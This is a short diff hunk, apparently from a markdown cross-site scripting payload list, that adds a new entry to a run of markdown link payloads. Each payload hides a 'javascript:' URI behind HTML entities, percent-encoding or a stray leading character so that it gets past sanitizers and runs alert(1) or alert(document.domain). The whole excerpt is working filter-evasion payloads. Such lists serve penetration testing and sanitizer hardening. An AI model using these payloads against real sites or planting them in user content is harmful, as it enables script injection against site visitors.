@@ -25,3 +25,6 @@ print(document.cookie)
 [XSS](javascript&#58this;alert(1&#41;)
 [XSS](Javas&#99;ript:alert(1&#41;)
 [XSS](Javas%26%2399;ript:alert(1&#41;)
+
+
+[XSS](�javascript:alert(document.domain&#41;)
